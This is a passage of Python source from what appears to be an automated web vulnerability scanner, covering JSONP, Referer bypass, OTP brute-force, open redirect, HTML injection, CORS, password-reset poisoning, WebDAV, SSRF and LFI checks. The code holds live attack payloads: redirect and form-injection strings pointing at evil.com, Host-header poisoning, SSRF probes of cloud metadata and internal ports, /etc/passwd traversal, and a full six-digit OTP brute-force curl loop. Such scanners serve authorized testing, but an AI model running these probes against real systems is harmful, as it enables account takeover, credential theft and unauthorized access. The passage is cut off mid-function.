        test_paths = profile.api_endpoints[:20] + ["/api","/api/v1","/api/data","/api/users"]
        for ep in test_paths[:15]:
            ep_url = base+ep if ep.startswith("/") else ep
            for param in jsonp_params[:4]:
                test_url = f"{ep_url}?{param}=APEXTEST"
                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
                ct = hdrs.get("content-type","")
                if code == 200 and ("APEXTEST(" in body or body.startswith("APEXTEST(")):
                    high(f"  JSONP ENDPOINT: {ep_url} (param: {param})")
                    found.append({"url":test_url,"param":param,"ep":ep_url})
                elif code == 200 and "javascript" in ct.lower() and "APEXTEST" in body:
                    warn(f"  JSONP candidate: {ep_url} (JS content-type, callback reflected)")
                    found.append({"url":test_url,"param":param,"ep":ep_url})
        if found:
            csp = (profile.security_headers.get("headers",{})
                   .get("content-security-policy",{}).get("value",""))
            csp_bypass = any(profile.host in csp or f.get("ep","") in csp for f in found)
            profile.findings.append(Finding(
                id="F-JSONP-001", title="JSONP Endpoint — Potential CSP Bypass",
                severity="HIGH" if csp_bypass else "MEDIUM",
                cwe="CWE-942", cvss=7.4 if csp_bypass else 5.4,
                description=f"JSONP endpoints discovered. If whitelisted in CSP, allows XSS bypass.",
                evidence="\n".join(f"{f['ep']}?{f['param']}=callback" for f in found),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{found[0]['url']}'",
                category="JSONP/CSP",
                remediation="Replace JSONP with CORS. If JSONP required, validate callback name strictly (alphanumeric only)."
            ))
        return profile

# ── TOOL 52: REFERER-BASED ACL BYPASS  (SKILL-62) ──────────
class RefererACLBypass:
    SPOOFED_REFERERS = [
        f"https://{{host}}/admin",
        f"https://{{host}}/",
        "https://localhost/admin",
        "https://127.0.0.1/admin",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("REFERER-52: Referer-based access control bypass")
        base = profile.url.rstrip("/"); host = profile.host
        protected_paths = ["/admin","/admin/users","/admin/config",
                           "/api/admin","/internal","/management"]
        found = []
        for path in protected_paths:
            url = base + path
            baseline_code, _, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if baseline_code not in [401,403]: continue
            for ref_tpl in self.SPOOFED_REFERERS:
                referer = ref_tpl.replace("{host}", host)
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                    headers_extra={"Referer": referer, "Origin": f"https://{host}"})
                if code == 200:
                    high(f"  REFERER BYPASS: {path} accessible via Referer: {referer}")
                    found.append({"path":path,"referer":referer,"code":code})
                    break
        if found:
            profile.findings.append(Finding(
                id="F-REF-001", title="Referer-Based Access Control Bypass",
                severity="HIGH", cwe="CWE-807", cvss=8.1,
                description=f"Protected paths accessible by spoofing Referer: {[f['path'] for f in found]}",
                evidence="\n".join(f"{f['path']}: Referer={f['referer']} → {f['code']}" for f in found),
                reproduction="\n".join(f"curl -sk -H 'Referer: {f['referer']}' '{base+f['path']}'" for f in found[:2]),
                poc_curl=f"curl -sk -H 'Referer: https://{host}/admin' '{base+found[0]['path']}'",
                category="Access Control",
                remediation="Never use Referer for authorization. Implement proper session-based auth."
            ))
        return profile

# ── TOOL 53: 2FA/OTP ENDPOINT FINDER  (SKILL-63) ───────────
class TwoFAEndpointFinder:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("2FA-53: 2FA/OTP endpoint discovery + brute-force surface")
        base = profile.url.rstrip("/")
        mfa_paths = ["/api/otp","/api/2fa","/api/mfa","/api/verify",
                     "/api/auth/otp","/api/auth/verify","/api/totp",
                     "/verify","/2fa","/mfa","/otp"]
        found = []
        for path in mfa_paths:
            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout,
                method="POST", data=b'{"otp":"123456","code":"123456"}',
                headers_extra={"Content-Type":"application/json"})
            if code in [200,400,401,422]:
                found.append({"path":path,"code":code})
                ok(f"  2FA endpoint: {path} [{code}]")
                # Check rate limiting on 2FA
                codes_rl = []
                for i in range(5):
                    test_code, _, _ = _fetch(base+path, cfg.user_agent, 3,
                        method="POST",
                        data=json.dumps({"otp":str(100000+i),"code":str(100000+i)}).encode(),
                        headers_extra={"Content-Type":"application/json"})
                    codes_rl.append(test_code)
                    time.sleep(0.1)
                if 429 not in codes_rl:
                    high(f"  NO RATE LIMIT on 2FA endpoint {path}! Brute-force 000000-999999 possible!")
                    profile.findings.append(Finding(
                        id=f"F-2FA-{len(profile.findings):03d}",
                        title="2FA/OTP Brute-Force — No Rate Limiting",
                        severity="CRITICAL", cwe="CWE-307", cvss=9.8,
                        description=f"OTP endpoint {path} has no rate limiting — 1M combinations in minutes.",
                        evidence=f"5 rapid requests returned: {codes_rl}",
                        reproduction=f"for i in $(seq 0 999999); do printf -v otp '%06d' $i; curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"'$otp'\"}}'; done",
                        poc_curl=f"curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"000000\"}}'",
                        category="2FA/MFA",
                        remediation="Rate-limit OTP attempts to 5/hour per account. Lock after 10 failures. Use time-based OTP with short window."
                    ))
        return profile

# ── TOOL 54: ERROR PAGE INTELLIGENCE  (SKILL-64) ───────────
class ErrorPageIntelligence:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ERRPAGE-54: Error page version/stack trace intelligence harvesting")
        base = profile.url.rstrip("/")
        trigger_urls = [
            base+"/'\"<>{}|\\^`",  # special chars
            base+"/nonexistent_apex_test_xyz_123",
            base+"/api/v1/../../../../etc/passwd",
            base+"?" + "a="*1000,  # long query
        ]
        findings_list = []
        for url in trigger_urls:
            try:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                if code in [400,404,500,503]:
                    # Stack trace
                    if re.search(r'at\s+[\w\.]+\([\w\.]+\.java:\d+\)|Traceback.*most recent|' +
                                 r'Stack trace:|at System\.Web\.|Microsoft\.AspNet|' +
                                 r'TypeError:|ReferenceError:', body, re.S):
                        high(f"  STACK TRACE EXPOSED: HTTP {code} at {url[:60]}")
                        findings_list.append({"type":"stack_trace","url":url,"code":code,"preview":body[:200]})
                    # Version disclosure
                    for pat, label in [
                        (r'Apache/(\d+\.\d+\.\d+)', "Apache"),
                        (r'nginx/(\d+\.\d+\.\d+)', "Nginx"),
                        (r'PHP/(\d+\.\d+\.\d+)', "PHP"),
                        (r'ASP\.NET version (\d+\.\d+)', "ASP.NET"),
                        (r'Python/(\d+\.\d+\.\d+)', "Python"),
                        (r'Express (\d+\.\d+\.\d+)', "Express"),
                        (r'Tomcat/(\d+\.\d+\.\d+)', "Tomcat"),
                    ]:
                        m = re.search(pat, body + str(hdrs), re.I)
                        if m:
                            warn(f"  VERSION DISCLOSURE: {label} {m.group(1)} in error page")
                            findings_list.append({"type":f"version_{label.lower()}","version":m.group(1),"url":url})
            except Exception: pass
        if findings_list:
            stack = [f for f in findings_list if f["type"]=="stack_trace"]
            vers  = [f for f in findings_list if f["type"].startswith("version_")]
            profile.findings.append(Finding(
                id="F-ERR-001", title="Sensitive Error Page Information Disclosure",
                severity="MEDIUM" if not stack else "HIGH",
                cwe="CWE-209", cvss=5.3,
                description=f"Error pages expose: {len(stack)} stack traces, {len(vers)} version strings.",
                evidence="\n".join(f"{f['type']}: {f.get('preview','')[:100] or f.get('version','')}" for f in findings_list[:5]),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in findings_list[:3]),
                poc_curl=f"curl -sk '{findings_list[0]['url']}'",
                category="Information Disclosure",
                remediation="Configure custom error pages. Disable stack traces in production. Hide version headers."
            ))
        return profile

# ── TOOL 55: OPEN REDIRECT CHAIN  (SKILL-65) ───────────────
class OpenRedirectChain:
    """Multi-hop redirect chain to arbitrary external domain."""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("REDIR-55: Open redirect chain + OAuth redirect_uri abuse")
        base = profile.url.rstrip("/")
        redirect_params = ["next","return","returnurl","redirect","goto","url","back","continue","redir"]
        chain_payloads = [
            "//evil.com", "////evil.com", "/\\evil.com",
            "https://evil.com%23." + profile.host,
            "https://evil.com%3F." + profile.host,
            "https://" + profile.host + "@evil.com",
            "https://evil.com/" + profile.host,
        ]
        found = []
        for param in redirect_params:
            for payload in chain_payloads:
                url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
                code, _, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                loc = hdrs.get("location","")
                if "evil.com" in loc or (code in [301,302,307] and loc and profile.host not in loc):
                    high(f"  OPEN REDIRECT CHAIN: ?{param}={payload} → {loc}")
                    found.append({"param":param,"payload":payload,"location":loc,"url":url})
        # OAuth redirect_uri bypass
        for auth_path in ["/oauth/authorize","/api/oauth","/auth/oauth2"]:
            for payload in chain_payloads[:3]:
                test_url = f"{base}{auth_path}?response_type=code&client_id=test&redirect_uri={urllib.parse.quote(payload)}"
                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
                if code in [301,302] and "evil.com" in hdrs.get("location",""):
                    high(f"  OAUTH REDIRECT_URI BYPASS: {auth_path}")
                    found.append({"param":"redirect_uri","payload":payload,"location":hdrs.get("location",""),"url":test_url})
        if found and len(found) > len(profile.open_redirects):
            profile.open_redirects.extend([f["url"] for f in found])
            profile.findings.append(Finding(
                id="F-REDIR-CHAIN-001", title="Open Redirect Chain — Multi-Vector",
                severity="MEDIUM", cwe="CWE-601", cvss=6.1,
                description=f"Open redirect bypasses: {list(set(f['payload'] for f in found))}",
                evidence="\n".join(f"{f['param']}={f['payload']} → {f['location']}" for f in found[:5]),
                reproduction="\n".join(f"curl -sk -I '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk -I '{found[0]['url']}'",
                category="Open Redirect",
                remediation="Validate redirect destinations against strict allowlist. Never use user input as redirect URL."
            ))
        return profile

# ── TOOL 56: HTML INJECTION / DANGLING MARKUP  (SKILL-66) ──
class HTMLInjectionScanner:
    HTML_PAYLOADS = [
        ("<b>HTMLTEST</b>", "<b>HTMLTEST</b>"),
        ("<h1>HTMLTEST", "<h1>HTMLTEST"),
        ('<a href="https://evil.com">click</a>', ">click</a>"),
        ('<img src="https://evil.com/pixel.gif"', 'evil.com/pixel.gif'),
        ('<form action="https://evil.com">', 'evil.com'),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HTMLINJ-56: HTML injection + dangling markup detection")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["name","message","search","q","input","text","comment"]))
        found = []
        for param in params[:8]:
            for payload, indicator in self.HTML_PAYLOADS:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                # Reflected unencoded?
                if indicator in body and html.escape(indicator) not in body:
                    sev = "HIGH" if "form" in payload or "img" in payload else "MEDIUM"
                    high(f"  HTML INJECTION: param '{param}' payload reflected unencoded ({sev})")
                    found.append({"param":param,"payload":payload,"url":test_url,"sev":sev})
                    break
        if found:
            dangling = [f for f in found if "img" in f["payload"] or "form" in f["payload"]]
            profile.findings.append(Finding(
                id="F-HTML-001", title="HTML Injection / Dangling Markup",
                severity="HIGH" if dangling else "MEDIUM",
                cwe="CWE-80", cvss=6.1,
                description=f"HTML injected unencoded in params: {[f['param'] for f in found]}",
                evidence="\n".join(f"{f['param']}: {f['payload'][:60]}" for f in found[:5]),
                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{found[0]['url']}'",
                category="HTML Injection",
                remediation="HTML-encode all user-controlled output. Implement strict CSP. Use a templating engine with auto-escaping."
            ))
        return profile

# ── TOOL 57: CORS PREFLIGHT ANALYZER  (SKILL-67) ───────────
class CORSPreflightAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CORS-PRE-57: CORS preflight OPTIONS analysis")
        issues = []
        for ep in [profile.url] + [profile.url.rstrip("/")+p for p in profile.api_endpoints[:5]]:
            code, _, hdrs = _fetch(ep, cfg.user_agent, cfg.timeout, method="OPTIONS",
                headers_extra={"Origin": f"https://evil.com",
                               "Access-Control-Request-Method": "DELETE",
                               "Access-Control-Request-Headers": "Authorization,X-Custom-Header"})
            acao = hdrs.get("access-control-allow-origin","")
            acam = hdrs.get("access-control-allow-methods","")
            acah = hdrs.get("access-control-allow-headers","")
            acac = hdrs.get("access-control-allow-credentials","")
            acma = hdrs.get("access-control-max-age","")
            if acao == "*" or acao == "https://evil.com":
                high(f"  CORS PREFLIGHT OPEN: {ep} — ACAO={acao} ACAM={acam}")
                issues.append({"url":ep,"acao":acao,"acam":acam,"acac":acac})
            if "DELETE" in acam.upper() or "PUT" in acam.upper():
                warn(f"  CORS allows dangerous methods: {acam} at {ep}")
            if acma and int(acma or 0) > 86400:
                warn(f"  CORS max-age very long: {acma}s — poisoned preflight cached!")
        if issues:
            profile.findings.append(Finding(
                id="F-CORS-PRE-001", title="CORS Preflight Misconfiguration",
                severity="HIGH", cwe="CWE-942", cvss=7.4,
                description=f"Preflight allows cross-origin requests from evil.com.",
                evidence="\n".join(f"{i['url']}: ACAO={i['acao']} ACAM={i['acam']}" for i in issues),
                reproduction=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
                poc_curl=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
                category="CORS",
                remediation="Validate Origin in preflight. Only allow safe methods (GET, POST) cross-origin unless explicitly required."
            ))
        return profile

# ── TOOL 58: INSECURE PASSWORD RESET  (SKILL-68) ───────────
class PasswordResetAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PWRESET-58: Insecure password reset flow analysis")
        base = profile.url.rstrip("/")
        reset_paths = ["/api/password/reset","/api/forgot-password","/forgot-password",
                       "/api/auth/reset","/auth/forgot","/api/v1/password/reset",
                       "/password-reset","/reset","/api/reset-password"]
        found = []
        for path in reset_paths:
            url = base + path
            # Test with host header injection
            code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                method="POST",
                data=json.dumps({"email":"victim@example.com"}).encode(),
                headers_extra={"Content-Type":"application/json",
                               "Host": "evil.com",
                               "X-Forwarded-Host": "evil.com"})
            if code in [200,201,202]:
                if re.search(r'sent|email|link|password|reset|check', body, re.I):
                    high(f"  PASSWORD RESET: {path} accepts requests with poisoned Host/X-Forwarded-Host!")
                    found.append({"path":path,"url":url,"type":"host_poisoning"})
            # Test token predictability — request 2 tokens quickly
            tokens = []
            for _ in range(2):
                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST",
                    data=json.dumps({"email":"test@test.com"}).encode(),
                    headers_extra={"Content-Type":"application/json"})
                token_match = re.search(r'token["\s:=]+([a-zA-Z0-9]{6,32})', tb, re.I)
                if token_match: tokens.append(token_match.group(1))
                time.sleep(0.1)
            if len(tokens) == 2 and tokens[0] == tokens[1]:
                high(f"  PASSWORD RESET TOKEN REUSE: same token generated twice at {path}!")
                found.append({"path":path,"url":url,"type":"token_reuse","tokens":tokens})
            elif len(tokens) == 2:
                # Check if tokens share prefix (low entropy)
                common_prefix = 0
                for a,b in zip(tokens[0],tokens[1]):
                    if a==b: common_prefix+=1
                    else: break
                if common_prefix > len(tokens[0])//2:
                    warn(f"  PASSWORD RESET: tokens share long prefix ({common_prefix}/{len(tokens[0])}) — low entropy?")
        if found:
            profile.findings.append(Finding(
                id="F-PWRESET-001", title="Insecure Password Reset Flow",
                severity="HIGH" if any(f["type"]=="host_poisoning" for f in found) else "MEDIUM",
                cwe="CWE-640", cvss=8.1,
                description=f"Password reset issues: {[f['type'] for f in found]}",
                evidence="\n".join(f"{f['type']}: {f['url']}" for f in found),
                reproduction=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@target.com\"}}'",
                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@{profile.host}\"}}'",
                category="Password Reset",
                remediation="Bind reset tokens to IP+User-Agent. Ignore Host override headers. Use cryptographically random tokens (256-bit)."
            ))
        return profile

# ── TOOL 59: WEBDAV MISCONFIGURATION  (SKILL-69) ───────────
class WebDAVScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WEBDAV-59: WebDAV misconfiguration (PROPFIND, PUT, MOVE)")
        base = profile.url.rstrip("/")
        issues = []
        # PROPFIND test
        propfind_body = b'<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>'
        code, body, hdrs = _fetch(base+"/", cfg.user_agent, cfg.timeout,
            method="PROPFIND", data=propfind_body,
            headers_extra={"Content-Type":"application/xml","Depth":"1"})
        if code == 207 and "multistatus" in body.lower():
            high(f"  WEBDAV PROPFIND: Returns 207 Multi-Status — directory listing possible!")
            issues.append({"method":"PROPFIND","code":207,"detail":"directory listing"})
        # PUT test — try to upload a test file
        test_content = b"APEX_HUNTER WebDAV test"
        put_code, put_body, _ = _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout,
            method="PUT", data=test_content,
            headers_extra={"Content-Type":"text/plain"})
        if put_code in [200,201,204]:
            high(f"  WEBDAV PUT: File uploaded to /apex_webdav_test.txt — arbitrary write!")
            issues.append({"method":"PUT","code":put_code,"detail":"arbitrary file write"})
            # Clean up
            _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout, method="DELETE")
        if issues:
            profile.findings.append(Finding(
                id="F-WEBDAV-001", title="WebDAV Misconfiguration",
                severity="CRITICAL" if any(i["method"]=="PUT" for i in issues) else "HIGH",
                cwe="CWE-749", cvss=9.8 if any(i["method"]=="PUT" for i in issues) else 7.5,
                description=f"WebDAV enabled: {[i['method'] for i in issues]}",
                evidence="\n".join(f"{i['method']}: HTTP {i['code']} — {i['detail']}" for i in issues),
                reproduction=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><D:propfind xmlns:D=\"DAV:\"><D:allprop/></D:propfind>'",
                poc_curl=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1'",
                category="WebDAV",
                remediation="Disable WebDAV unless required. Restrict PUT/DELETE to authenticated users."
            ))
        return profile

# ── TOOL 60: CONTENT-TYPE CONFUSION  (SKILL-70) ────────────
class ContentTypeConfusion:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CTCONF-60: Content-type confusion attack")
        base = profile.url.rstrip("/")
        issues = []
        # Test API endpoints that expect JSON but also accept text/html
        for ep in (profile.api_endpoints[:10] or ["/api"]):
            url = base+ep if ep.startswith("/") else ep
            test_payload = b'{"test":"<script>alert(1)</script>"}'
            for ct in ["text/html","text/plain","application/x-www-form-urlencoded","text/xml"]:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST", data=test_payload,
                    headers_extra={"Content-Type":ct,"Accept":"application/json"})
                resp_ct = hdrs.get("content-type","").lower()
                # If JSON API returns HTML content-type when we send HTML content-type
                if code in [200,201] and "html" in resp_ct and ct=="text/html":
                    warn(f"  CT CONFUSION: {ep} mirrors Content-Type — XSS amplification possible")
                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct})
                # If JSON API reflects input as HTML without encoding
                if code==200 and "text/html" in resp_ct and "<script>" in body:
                    high(f"  REFLECTED XSS via Content-Type confusion at {ep}!")
                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct,"xss":True})
        if issues:
            xss_issues = [i for i in issues if i.get("xss")]
            profile.findings.append(Finding(
                id="F-CT-001", title="Content-Type Confusion Attack",
                severity="HIGH" if xss_issues else "MEDIUM",
                cwe="CWE-116", cvss=7.4 if xss_issues else 5.3,
                description=f"API reflects Content-Type from request, enabling type confusion.",
                evidence="\n".join(f"{i['ep']}: sent {i['sent_ct']} → resp {i['resp_ct']}" for i in issues[:5]),
                reproduction="\n".join(f"curl -sk -X POST '{base+i['ep']}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'" for i in issues[:2]),
                poc_curl=f"curl -sk -X POST '{base+(issues[0]['ep'])}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'",
                category="Content-Type",
                remediation="Set explicit Content-Type in all responses. Never mirror request Content-Type."
            ))
        return profile

# ── TOOL 61: INTERNAL SERVICE DISCOVERY VIA SSRF  (SKILL-71) ─
class InternalServiceDiscovery:
    """Uses SSRF params to map internal services (non-exploiting scan)."""
    INTERNAL_SERVICES = [
        ("169.254.169.254",80,"AWS/Azure/GCP metadata"),
        ("localhost",6379,"Redis"),("127.0.0.1",6379,"Redis"),
        ("localhost",27017,"MongoDB"),("127.0.0.1",27017,"MongoDB"),
        ("localhost",9200,"Elasticsearch"),("127.0.0.1",9200,"Elasticsearch"),
        ("localhost",8080,"Internal HTTP"),("127.0.0.1",8080,"Internal HTTP"),
        ("localhost",3306,"MySQL"),("127.0.0.1",5432,"PostgreSQL"),
        ("localhost",11211,"Memcached"),("127.0.0.1",2375,"Docker API"),
        ("localhost",9090,"Prometheus"),("127.0.0.1",8500,"Consul"),
        ("localhost",4001,"etcd"),("127.0.0.1",2379,"etcd"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("INTERNALSVC-61: Internal service map via SSRF candidates")
        if not profile.ssrf_params:
            info("  No SSRF params found — skipping internal service scan")
            return profile
        base = profile.url.rstrip("/")
        param = profile.ssrf_params[0]
        reachable = []
        for host_int, port, label in self.INTERNAL_SERVICES:
            ssrf_url = f"http://{host_int}:{port}/"
            test_url = f"{base}?{param}={urllib.parse.quote(ssrf_url)}"
            t0 = time.time()
            code, body, _ = _fetch(test_url, cfg.user_agent, 4)
            elapsed = time.time() - t0
            if code in [200,400,401,403] or (elapsed < 1.5 and code != 0):
                warn(f"  INTERNAL SERVICE REACHABLE: {label} ({host_int}:{port}) via SSRF param '{param}'")
                reachable.append({"host":host_int,"port":port,"label":label,"code":code,"time":round(elapsed,2)})
        if reachable:
            profile.findings.append(Finding(
                id="F-INTNET-001", title="Internal Network Service Discovery via SSRF",
                severity="CRITICAL", cwe="CWE-918", cvss=9.8,
                description=f"Internal services reachable: {[r['label'] for r in reachable]}",
                evidence="\n".join(f"{r['label']} ({r['host']}:{r['port']}): HTTP {r['code']} in {r['time']}s" for r in reachable),
                reproduction="\n".join(f"curl -sk '{base}?{param}=http://{r['host']}:{r['port']}/'" for r in reachable[:3]),
                poc_curl=f"curl -sk '{base}?{param}=http://169.254.169.254/latest/meta-data/'",
                category="SSRF/Internal Network",
                remediation="Use SSRF protection library. Block RFC1918+metadata IPs at WAF/egress firewall."
            ))
        return profile

# ── TOOL 62: MASS SUBDOMAIN LIVE CHECK  (SKILL-72) ─────────
class SubdomainLiveCheck:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SUBLIVE-62: Deep subdomain live check + service fingerprinting")
        all_subs = list(set(profile.subdomains + profile.ct_subdomains))
        resolver = DNSResolver()
        live_services = []
        for sub in all_subs[:40]:
            ip = resolver.resolve(sub)
            if ip == "NXDOMAIN": continue
            for port, scheme in [(443,"https"),(80,"http"),(8080,"http"),(8443,"https")]:
                code, body, hdrs = _fetch(f"{scheme}://{sub}:{port}/",
                                          cfg.user_agent, 5)
                if code and code != 0:
                    server = hdrs.get("server","")
                    powered = hdrs.get("x-powered-by","")
                    tech = []
                    if "wordpress" in body.lower(): tech.append("WordPress")
                    if "jenkins" in body.lower(): tech.append("Jenkins")
                    if "grafana" in body.lower(): tech.append("Grafana")
                    if "kibana" in body.lower(): tech.append("Kibana")
                    if "gitlab" in body.lower(): tech.append("GitLab")
                    if tech or port != 443:
                        warn(f"  LIVE SUBDOMAIN: {sub}:{port} [{code}] {server} {tech}")
                        live_services.append({"sub":sub,"port":port,"code":code,"tech":tech,"server":server})
                    break
        if live_services:
            hidden = [s for s in live_services if s["port"] in [8080,8443]]
            if hidden:
                profile.findings.append(Finding(
                    id="F-SUBLIVE-001", title="Non-Standard Port Services on Subdomains",
                    severity="MEDIUM", cwe="CWE-200", cvss=5.3,
                    description=f"{len(hidden)} subdomains expose services on non-standard ports.",
                    evidence="\n".join(f"{s['sub']}:{s['port']} [{s['code']}] {s['server']} {s['tech']}" for s in hidden[:10]),
                    reproduction="\n".join(f"curl -sk 'http://{s['sub']}:{s['port']}/'" for s in hidden[:5]),
                    poc_curl=f"curl -sk 'http://{hidden[0]['sub']}:{hidden[0]['port']}/'",
                    category="Attack Surface",
                    remediation="Audit all services on non-standard ports. Apply same security controls as primary domain."
                ))
        return profile

# ── TOOL 63: LFI/PATH TRAVERSAL  (SKILL-73) ────────────────
class LFIScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("LFI-63: Local File Inclusion / path traversal")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["file","path","page","template","view","include","doc","document","src","filename","img","image"]))
        confirmed = []
        for param in params[:10]:
            for payload in PAYLOADS_LFI[:8]:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if re.search(r'root:.*:0:0:|bin:.*:1:1:|daemon:.*:/usr/sbin', body):
                    high(f"  LFI CONFIRMED: {param}={payload} → /etc/passwd leaked!")
                    confirmed.append({"param":param,"payload":payload,"url":url})
                    break
                elif re.search(r'\[boot loader\]|extension_dir|allow_url_include', body, re.I):
                    high(f"  LFI CONFIRMED: {param}={payload} → Windows/PHP config!")
                    confirmed.append({"param":param,"payload":payload,"url":url})
                    break
                # POST
                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param:payload}).encode())
                if re.search(r'root:.*:0:0:|bin:.*:1:1:', pb):
                    high(f"  LFI POST: {param}={payload}")
                    confirmed.append({"param":param,"payload":payload,"url":base+"[POST]"})
                    break
        if confirmed:
            profile.findings.append(Finding(
                id="F-LFI-001", title="Local File Inclusion (LFI)",
                severity="CRITICAL", cwe="CWE-22", cvss=9.1,
                description=f"LFI confirmed reading /etc/passwd via params: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="LFI",
                remediation="Never pass user input to file system functions. Use allow-list of permitted files."
            ))
        return profile

# ── TOOL 64: COOKIE JAR OVERFLOW / SESSION FIXATION  (SKILL-74) ─
class SessionSecurityAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SESSION-64: Session fixation + cookie jar overflow analysis")
        base = profile.url.rstrip("/")
        issues = []
        # Session fixation: preset a session cookie and see if it's accepted
        preset_sid = "APEXHUNTER_FIXED_SESSION_12345"
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
            headers_extra={"Cookie": f"session={preset_sid}; PHPSESSID={preset_sid}; JSESSIONID={preset_sid}"})
        # If server returns same session ID back, it's accepting our preset one
        set_cookie = hdrs.get("set-cookie","")
        if preset_sid in set_cookie or (not set_cookie and code == 200):
            if preset_sid in set_cookie:
                high(f"  SESSION FIXATION: Server echoes back preset session ID!")
                issues.append({"type":"fixation","detail":"preset SID echoed"})
        # Cookie scope: check if session cookies have too broad domain
        for c in profile.cookie_results:
            name = c.get("name","")
            if re.search(r'session|sid|auth|token', name, re.I):
                if not c.get("issues"):
                    ok(f"  Session cookie '{name}' properly secured")
                else:
                    warn(f"  Session cookie '{name}' issues: {c.get('issues')}")
                    issues.append({"type":"cookie_flags","name":name,"issues":c.get("issues")})
        # Test for session in URL
        for ep in profile.api_endpoints[:10]:
            url = base+ep if ep.startswith("/") else ep
            if re.search(r'[?&](session|sid|token|auth|PHPSESSID|JSESSIONID)=', url, re.I):
                high(f"  SESSION IN URL: {url[:80]}")
                issues.append({"type":"session_in_url","url":url})
        if any(i["type"]=="session_in_url" for i in issues):
            profile.findings.append(Finding(
                id="F-SES-001", title="Session Token Exposed in URL",
                severity="HIGH", cwe="CWE-598", cvss=7.5,
                description="Session tokens visible in URLs — logged in server logs, browser history, Referer.",
                evidence="\n".join(i.get("url","") for i in issues if i["type"]=="session_in_url"),
                reproduction="# Check browser address bar and server access logs",
                poc_curl=f"# Session token visible in URLs listed above",
                category="Session Management",
                remediation="Use POST body or Authorization header for tokens. Never put secrets in GET parameters."
            ))
        return profile

# ── TOOL 65: SECURITY.TXT & VDP DISCOVERY  (SKILL-75) ──────
class VDPDiscovery:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("VDP-65: security.txt + VDP/bug bounty scope discovery")
        base = profile.url.rstrip("/")
        vdp_paths = ["/.well-known/security.txt","/security.txt",
                     "/.well-known/change-password","/bugbounty",
                     "/responsible-disclosure","/vulnerability-disclosure"]
        found = []; policy = {}
        for path in vdp_paths:
            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout)
            if code == 200 and len(body) > 10:
                ok(f"  VDP/Security.txt found: {path}")
                found.append({"path":path,"body":body[:500]})
                # Parse security.txt fields
                for line in body.splitlines():
                    line = line.strip()
                    for field in ["Contact:","Expires:","Encryption:","Acknowledgments:","Policy:","Hiring:","Scope:"]:
                        if line.startswith(field):
                            policy[field.rstrip(":")] = line[len(field):].strip()
                            ok(f"  {line}")
        if policy.get("Contact"):
            ok(f"  Bug reports: {policy['Contact']}")
        if not found:
